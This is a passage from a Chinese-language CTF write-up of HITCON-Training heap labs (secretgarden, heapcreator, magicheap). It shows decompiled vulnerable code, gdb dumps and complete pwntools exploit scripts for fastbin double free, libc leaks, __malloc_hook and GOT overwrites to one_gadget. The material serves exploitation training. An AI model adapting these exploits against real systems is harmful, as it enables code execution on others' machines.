class=\"string\">\"a\"</span>, <span class=\"string\">\"aaaa\"</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x50</span>, <span class=\"string\">\"b\"</span>, <span class=\"string\">\"bbbb\"</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x50</span>, <span class=\"string\">\"c\"</span>, <span class=\"string\">\"cccc\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 1-&gt;2-&gt;1</span></span><br><span class=\"line\">del_(<span class=\"number\">1</span>)</span><br><span class=\"line\">del_(<span class=\"number\">2</span>)</span><br><span class=\"line\">del_(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">addr = <span class=\"number\">0x601ffa</span></span><br><span class=\"line\">freegot = elf.got[<span class=\"string\">'free'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x50</span>, p64(addr), <span class=\"string\">\"fake\"</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x50</span>, <span class=\"string\">\"d\"</span>, <span class=\"string\">\"dddd\"</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x50</span>, <span class=\"string\">\"e\"</span>, <span class=\"string\">\"eeee\"</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x50</span>,<span class=\"string\">\"a\"</span>*<span class=\"number\">6</span> + p64(<span class=\"number\">0</span>) + p64(magic) * <span class=\"number\">2</span> ,<span class=\"string\">\"red\"</span>) <span class=\"comment\">#malloc in fake_chunk</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h3 id=\"提高-1\"><a href=\"#提高-1\" class=\"headerlink\" title=\"提高\"></a>提高</h3><h4 id=\"leak-libc\"><a href=\"#leak-libc\" class=\"headerlink\" title=\"leak libc\"></a>leak libc</h4><p>leak libc最简单的方法之一，就是使用unsorted bin攻击，将free后的unsorted bin，直接malloc，这不会改变其中泄漏出的libc地址。通过overlapping，或者修改inuse等辅助变量，也都可能实现leak libc。这里我们使用unsorted bin攻击直接leak libc。</p>\n<h4 id=\"劫持控制流\"><a href=\"#劫持控制流\" class=\"headerlink\" title=\"劫持控制流\"></a>劫持控制流</h4><p>我们通过复写<code>__malloc_hook</code>的got表即可实现利用，在libc上，<code>__malloc_hook</code>紧挨着main_arena（已经leak得到main_arena+0x88的地址）。我们仍然通过上述调整偏移的方法，寻找某个<code>__malloc_hook</code>之前合法的地址。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  x/32gx 0x7fdaa8a46af0 + 5 - 0x8</span><br><span class=\"line\">0x7fdaa8a46aed &lt;_IO_wide_data_0+301&gt;:\t0xdaa8a45260000000\t0x000000000000007f</span><br><span class=\"line\">0x7fdaa8a46afd:\t0xdaa8707e20000000\t0xdaa8707a0000007f</span><br><span class=\"line\">0x7fdaa8a46b0d &lt;__realloc_hook+5&gt;:\t0x000000000000007f\t0x0000000000000000</span><br><span class=\"line\">0x7fdaa8a46b1d:\t0x0000000000000000\t0x0000000000000000</span><br></pre></td></tr></table></figure>\n<p>可以看到，当分配到如下地址时，size正好为0x7f，即malloc(0x60)的chunk，然后我们将<code>__malloc_hook</code>覆盖为one_gadget即可。</p>\n<h4 id=\"触发-malloc-hook\"><a href=\"#触发-malloc-hook\" class=\"headerlink\" title=\"触发__malloc_hook\"></a>触发__malloc_hook</h4><p>这里如果我们直接调用add功能，而在malloc(0x28)时触发malloc_hook，会发现所有的one_gadget地址都不符合要求。这里我们有一个小trick，如果我们对同一个chunk free两次，触发对double free的报错，这时libc代码也会触发_malloc_hook。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 两次free同一个chunk，触发报错函数</span></span><br><span class=\"line\"><span class=\"comment\">// 而调用报错函数的时候又会用到malloc-hook，从而getshell</span></span><br><span class=\"line\"><span class=\"comment\">/* Another simple check: make sure the top of the bin is not the</span></span><br><span class=\"line\"><span class=\"comment\">       record we are going to add (i.e., double free).  */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (__builtin_expect (old == p, <span class=\"number\">0</span>))</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        errstr = <span class=\"string\">\"double free or corruption (fasttop)\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> errout;</span><br><span class=\"line\">\t\t\t&#125;</span><br></pre></td></tr></table></figure>\n<p>完整exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/x86_64-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./secretgarden\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./secretgarden\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span><span class=\"params\">(size, name, color)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice : \"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"name :\"</span>)</span><br><span class=\"line\">\tp.sendline(str(size))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"flower :\"</span>)</span><br><span class=\"line\">\tp.send(name)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"flower :\"</span>)</span><br><span class=\"line\">\tp.sendline(color)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">visit</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice : \"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">del_</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice : \"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"garden:\"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">clean</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice : \"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"4\"</span>)</span><br><span class=\"line\"> </span><br><span class=\"line\">add(<span class=\"number\">0x80</span>,<span class=\"string\">\"a\"</span>,<span class=\"string\">\"aaaa\"</span>) <span class=\"comment\"># 0</span></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>,<span class=\"string\">\"b\"</span>,<span class=\"string\">\"bbbb\"</span>) <span class=\"comment\"># 1</span></span><br><span class=\"line\">del_(<span class=\"number\">0</span>)</span><br><span class=\"line\">clean()</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>,<span class=\"string\">\"c\"</span>,<span class=\"string\">\"cccc\"</span>) <span class=\"comment\"># 0</span></span><br><span class=\"line\"></span><br><span class=\"line\">visit()</span><br><span class=\"line\">libc_addr = u64(p.recvuntil(<span class=\"string\">\"\\x7f\"</span>)[<span class=\"number\">-6</span>:].ljust(<span class=\"number\">8</span>, <span class=\"string\">\"\\x00\"</span>))</span><br><span class=\"line\">offset = <span class=\"number\">0x3c4b63</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc.address = libc_addr - offset</span><br><span class=\"line\"></span><br><span class=\"line\">malloc_hook = libc.symbols[<span class=\"string\">'__malloc_hook'</span>]</span><br><span class=\"line\">addr = <span class=\"number\">0x3c4aed</span> + libc.address</span><br><span class=\"line\">one_gadget = <span class=\"number\">0xf02a4</span> + libc.address</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x60</span>, <span class=\"string\">\"a\"</span>, <span class=\"string\">\"aaaa\"</span>) <span class=\"comment\"># 2</span></span><br><span class=\"line\">add(<span class=\"number\">0x60</span>, <span class=\"string\">\"b\"</span>, <span class=\"string\">\"bbbb\"</span>) <span class=\"comment\"># 3</span></span><br><span class=\"line\"></span><br><span class=\"line\">del_(<span class=\"number\">2</span>)</span><br><span class=\"line\">del_(<span class=\"number\">3</span>)</span><br><span class=\"line\">del_(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x60</span>, p64(addr), <span class=\"string\">\"fake\"</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x60</span>, <span class=\"string\">\"c\"</span>, <span class=\"string\">\"cccc\"</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x60</span>, <span class=\"string\">\"d\"</span>, <span class=\"string\">\"dddd\"</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x60</span>, <span class=\"number\">0x13</span> * <span class=\"string\">\"e\"</span> + p64(one_gadget),<span class=\"string\">\"asdf\"</span>)</span><br><span class=\"line\"><span class=\"keyword\">print</span> hex(addr)</span><br><span class=\"line\"></span><br><span class=\"line\">del_(<span class=\"number\">2</span>)</span><br><span class=\"line\">del_(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"Lab13——heapcreator\"><a href=\"#Lab13——heapcreator\" class=\"headerlink\" title=\"Lab13——heapcreator\"></a>Lab13——heapcreator</h2><h3 id=\"防护-3\"><a href=\"#防护-3\" class=\"headerlink\" title=\"防护\"></a>防护</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab13$ checksec heapcreator</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab13/heapcreator&apos;</span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析-3\"><a href=\"#分析-3\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>该题也是标准的堆题，功能有增删改查。</p>\n<h4 id=\"create\"><a href=\"#create\" class=\"headerlink\" title=\"create\"></a>create</h4><p>首先malloc(0x10)的chunk，存储在全局指针数组heaparray上。chunk中记录指向内容的指针和输入的size，</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">chunk</span>&#123;</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> size; <span class=\"comment\">// 0x0</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> *content; <span class=\"comment\">// 0x8</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h4 id=\"edit\"><a href=\"#edit\" class=\"headerlink\" title=\"edit\"></a>edit</h4><p>该功能内存在漏洞，在写入的时候会多写入一位，所以存在off_by_one write漏洞。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">unsigned</span> __<span class=\"function\">int64 <span class=\"title\">edit_heap</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> v1; <span class=\"comment\">// [rsp+Ch] [rbp-14h]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> buf; <span class=\"comment\">// [rsp+10h] [rbp-10h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int64 v3; <span class=\"comment\">// [rsp+18h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v3 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Index :\"</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;buf, <span class=\"number\">4u</span>LL);</span><br><span class=\"line\">  v1 = atoi(&amp;buf);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v1 &lt; <span class=\"number\">0</span> || v1 &gt; <span class=\"number\">9</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"Out of bound!\"</span>);</span><br><span class=\"line\">    _exit(<span class=\"number\">0</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( heaparray[v1] )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"Content of heap : \"</span>, &amp;buf);</span><br><span class=\"line\">    read_input(*((<span class=\"keyword\">void</span> **)heaparray[v1] + <span class=\"number\">1</span>), *(_QWORD *)heaparray[v1] + <span class=\"number\">1L</span>L);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"Done !\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"No such heap !\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v3;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"show\"><a href=\"#show\" class=\"headerlink\" title=\"show\"></a>show</h4><p>输出size和content的内容。</p>\n<h4 id=\"delete\"><a href=\"#delete\" class=\"headerlink\" title=\"delete\"></a>delete</h4><p>依次free掉content和chunk两个堆块，然后将heaparray全局数组上对应项置为NULL，所以不存在UAF漏洞。</p>\n<h3 id=\"利用-3\"><a href=\"#利用-3\" class=\"headerlink\" title=\"利用\"></a>利用</h3><p>​    我们要利用off-by-one写漏洞，实现前向的overlapping，具体方法是，首先申请两个size分别为0x18和0x10的chunk，使得size为0x18的chunk复用下一个chunk的prev_size字段；然后用edit功能修改下个chunk的size字段为\\x41（或\\x40）都可以，此时调用delete功能，就会向fastbin数组中0x20和0x40的单向链表中分别放入一个chunk，其中0x40的chunk与0x20的chunk形成了重叠，之后的利用就顺理成章了，我们看一下exp。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/x86_64-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./heapcreator\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./heapcreator\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">create</span><span class=\"params\">(size, content)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Heap :\"</span>)</span><br><span class=\"line\">\tp.sendline(str(size))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"heap:\"</span>)</span><br><span class=\"line\">\tp.send(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">edit</span><span class=\"params\">(index, content)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Index :\"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"heap : \"</span>)</span><br><span class=\"line\">\tp.send(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Index :\"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delete</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"4\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Index :\"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\">create(<span class=\"number\">0x18</span>, <span class=\"string\">\"a\"</span>) <span class=\"comment\"># 0 </span></span><br><span class=\"line\">create(<span class=\"number\">0x10</span>, <span class=\"string\">\"b\"</span>) <span class=\"comment\"># 1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># change size</span></span><br><span class=\"line\">edit(<span class=\"number\">0</span>, <span class=\"string\">\"a\"</span> * <span class=\"number\">0x18</span> + <span class=\"string\">\"\\x41\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">atoi_got = elf.got[<span class=\"string\">'atoi'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># push to fastbin</span></span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">payload = <span class=\"string\">\"a\"</span> * <span class=\"number\">0x10</span> + p64(<span class=\"number\">0</span>) + <span class=\"string\">\"\\x21\"</span>.ljust(<span class=\"number\">8</span>,<span class=\"string\">\"\\x00\"</span>) + p64(<span class=\"number\">0x30</span>) + p64(atoi_got)</span><br><span class=\"line\"><span class=\"comment\"># use overlapping </span></span><br><span class=\"line\">create(<span class=\"number\">0x30</span>, payload) <span class=\"comment\"># 1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># leak</span></span><br><span class=\"line\">show(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">addr = u64(p.recvuntil(<span class=\"string\">\"\\x7f\"</span>)[<span class=\"number\">-6</span>:].ljust(<span class=\"number\">8</span>, <span class=\"string\">\"\\x00\"</span>))</span><br><span class=\"line\">libc_base = addr - libc.symbols[<span class=\"string\">'atoi'</span>]</span><br><span class=\"line\">one_gadget = <span class=\"number\">0xf1147</span> + libc_base</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># hijack got</span></span><br><span class=\"line\">edit(<span class=\"number\">1</span>, p64(one_gadget))</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(<span class=\"string\">\"pwnit\"</span>)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"Lab14——magicheap\"><a href=\"#Lab14——magicheap\" class=\"headerlink\" title=\"Lab14——magicheap\"></a>Lab14——magicheap</h2><h3 id=\"防护-4\"><a href=\"#防护-4\" class=\"headerlink\" title=\"防护\"></a>防护</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab14$ checksec magicheap</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab14/magicheap&apos;</span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析-4\"><a href=\"#分析-4\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>还是增删改查。</p>\n<p>当输入4869时，若全局变量magic &gt; 0x1305，则直接cat flag。</p>\n<p>漏洞存在于edit功能中，存在一个任意长度的堆溢出。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">unsigned</span> __<span class=\"function\">int64 <span class=\"title\">edit_heap</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">size_t</span> v0; <span class=\"comment\">// ST08_8</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> v2; <span class=\"comment\">// [rsp+4h] [rbp-1Ch]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> buf; <span class=\"comment\">// [rsp+10h] [rbp-10h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int64 v4; <span class=\"comment\">// [rsp+18h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v4 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Index :\"</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;buf, <span class=\"number\">4u</span>LL);</span><br><span class=\"line\">  v2 = atoi(&amp;buf);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v2 &lt; <span class=\"number\">0</span> || v2 &gt; <span class=\"number\">9</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"Out of bound!\"</span>);</span><br><span class=\"line\">    _exit(<span class=\"number\">0</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( heaparray[v2] )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"Size of Heap : \"</span>, &amp;buf);</span><br><span class=\"line\">    read(<span class=\"number\">0</span>, &amp;buf, <span class=\"number\">8u</span>LL);</span><br><span class=\"line\">    v0 = atoi(&amp;buf);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"Content of heap : \"</span>, &amp;buf);</span><br><span class=\"line\">    read_input(heaparray[v2], v0);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"Done !\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"No such heap !\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v4;</span><br><span 